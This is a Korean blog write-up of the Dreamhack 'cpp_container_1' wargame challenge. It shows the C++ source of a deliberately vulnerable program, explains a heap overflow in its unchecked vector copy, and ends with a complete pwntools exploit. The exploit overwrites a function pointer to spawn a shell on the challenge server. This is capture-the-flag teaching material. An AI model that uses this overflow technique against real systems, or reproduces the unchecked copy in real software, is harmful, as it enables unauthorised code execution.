---
title: "cpp_container_1 writeup"
date: 2026-04-01 00:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, bof, heap, cpp, dreamhack]
---

## Analysis

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

PIE가 꺼져 있어 바이너리의 주소가 고정된다.

### Source Code
```cpp
// g++ -o pwn-container-overflow-1 pwn-container-overflow-1.cpp -no-pie
#include <iostream>
#include <vector>
#include <cstdlib>
#include <csignal>
#include <unistd.h>
#include <cstdio>
void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}
void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void print_menu(){
        std::cout << "container system!" << std::endl;
        std::cout << "1. make container" << std::endl;
        std::cout << "2. modify container" << std::endl;
        std::cout << "3. copy container" << std::endl;
        std::cout << "4. view container" << std::endl;
        std::cout << "5. exit system" << std::endl;
        std::cout << "[*] select menu: ";
}
class Menu{
public:
        Menu(){
        }
        Menu(const Menu&){
        }
        void (*fp)(void) = print_menu;
};
void getshell(){
        system("/bin/sh");
}
void make_container(std::vector<int> &src, std::vector<int> &dest){
        std::cout << "Input container1 data" << std::endl;
        int data = 0;
        for(std::vector<int>::iterator iter = src.begin(); iter != src.end(); iter++){
                std::cout << "input: ";
                std::cin >> data;
                *iter = data;
        }
        std::cout << std::endl;
        std::cout << "Input container2 data" << std::endl;
        for(std::vector<int>::iterator iter = dest.begin(); iter != dest.end(); iter++){
                std::cout << "input: ";
                std::cin >> data;
                *iter = data;
        }
        std::cout << std::endl;
}
void modify_container(std::vector<int> &src, std::vector<int> &dest){
        int size = 0;
        std::cout << "Input container1 size" << std::endl;
        std::cin >> size;
        src.resize(size);
        std::cout << "Input container2 size" << std::endl;
        std::cin >> size;
        dest.resize(size);
}
void copy_container(std::vector<int> &src, std::vector<int> &dest){
        std::copy(src.begin(), src.end(), dest.begin());
        std::cout << "copy complete!" << std::endl;
}
void view_container(std::vector<int> &src, std::vector<int> &dest){
        std::cout << "container1 data: [";
        for(std::vector<int>::iterator iter = src.begin(); iter != src.end(); iter++){
                std::cout << *iter << ", ";
        }
        std::cout << "]" << "\n" << std::endl;
        std::cout << "container2 data: [";
        for(std::vector<int>::iterator iter = dest.begin(); iter != dest.end(); iter++){
                std::cout << *iter << ", ";
        }
        std::cout << "]" << "\n" << std::endl;
}
int main(){
        initialize();
        std::vector<int> src(3, 0);
        std::vector<int> dest(3, 0);
        Menu *menu = new Menu();
        int selector = 0;
        while(1){
                menu->fp();
                std::cin >> selector;
                switch(selector){
                        case 1:
                                make_container(src, dest);
                                break;
                        case 2:
                                modify_container(src, dest);
                                break;
                        case 3:
                                copy_container(src, dest);
                                break;
                        case 4:
                                view_container(src, dest);
                                break;
                        case 5:
                                return 0;
                                break;
                        default:
                                break;
                }
        }
}
```
```cpp
class Menu{
public:
	Menu(){
	}
	Menu(const Menu&){
	}
	void (*fp)(void) = print_menu;
};
```

필드에 함수 포인터만 있다. 이 객체는 동적 할당될 때 32바이트의 청크 크기를 갖게 된다.
```cpp
int main(){
	initialize();
	std::vector<int> src(3, 0);
	std::vector<int> dest(3, 0);
	Menu *menu = new Menu();
	int selector = 0;

	while(1){
		menu->fp();
		std::cin >> selector;
		switch(selector){
			case 1:
				make_container(src, dest);
				break;
			case 2:
				modify_container(src, dest);
				break;
			case 3:
				copy_container(src, dest);
				break;
			case 4:
				view_container(src, dest);
				break;
			case 5:
				return 0;
				break;
			default:
				break;
		}
	}
}
```

vector는 생성자가 호출될 때 내부에서 데이터를 저장할 배열을 동적 할당한다. 따라서 각 할당은 Top Chunk의 낮은 주소부터 필요한 크기만큼 분할하여 할당된다. 즉, `src`, `dest`의 내부 배열과 `menu` 객체는 가상 주소 공간상에서 순서대로 연속되어 있다.

`make_container()`에서 벡터들의 각 원소 값을 수정할 수 있고, `modify_container()`에서 벡터 크기를 늘릴 수 있다. `copy_container()`에서는 `src`의 원소들을 `dest`에 복사할 수 있다.

## Vulnerability Analysis

`copy_container()`에서 `dest`의 크기를 고려하지 않고 `src`의 원소들을 복사하기 때문에 BOF 취약점이 존재한다. 해당 바이너리는 PIE가 없고 `getshell` 함수가 제공된다. 따라서 `menu` 객체의 함수 포인터인 `fp` 필드 값을 `getshell` 주소로 덮어쓰면 쉘을 획득할 수 있다.

## Exploit

`modify_container()`에서 `src`의 벡터 크기를 `menu`의 `fp` 필드에 도달할 정도로 증가시킨 후, `make_container()`에서 `src`의 각 원소 값을 `getshell` 주소로 채우고 `copy_container()`를 호출하면 된다. 우선 `modify_container()`에서 `src`가 리사이즈되면 `src`의 기존 배열은 해제되고 새로운 크기의 배열이 동적 할당된다. 이때 힙 레이아웃은 `dest` -> `menu` -> `src` 순서가 된다. `dest`는 `int` 원소 3개로 생성되었으므로 힙 청크 최소 크기인 32바이트일 것이다. `menu`는 8바이트 `fp` 필드만 존재하므로 마찬가지로 32바이트 청크일 것이다. 청크는 헤더(size) -> 유저 데이터 순서로 저장되므로, `dest`의 내부 배열에서 `menu`의 `fp` 필드까지의 거리는 24(유저 데이터) + 8(`menu`의 헤더) = 32이다. 따라서 `fp` 필드를 덮어쓰려면 40바이트를 써야 하고, `src`는 `resize(10)`이 되어야 한다.

아래는 전체 익스플로잇 코드이다.
```python

#!/usr/bin/env python3

from pwn import *

exe = ELF("./cpp_container_1")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 11219)

    return r


def main():
    r = conn()

    getshell = exe.symbols["_Z8getshellv"]
    src_size = 10
    dst_size = 3

    r.sendlineafter(b"select menu: ", b"2")
    r.sendlineafter(b"Input container1 size\n", str(src_size).encode())
    r.sendlineafter(b"Input container2 size\n", str(dst_size).encode())

    r.sendlineafter(b"select menu: ", b"1")
    for i in range(src_size // 2):
        r.sendlineafter(b"input: ", str(getshell & 0xFFFFFFFF).encode())
        r.sendlineafter(b"input: ", str((getshell >> 32) & 0xFFFF).encode())
    for i in range(dst_size):
        r.sendlineafter(b"input: ", b"1111")
    
    r.sendlineafter(b"select menu: ", b"3")

    r.interactive()


if __name__ == "__main__":
    main()
```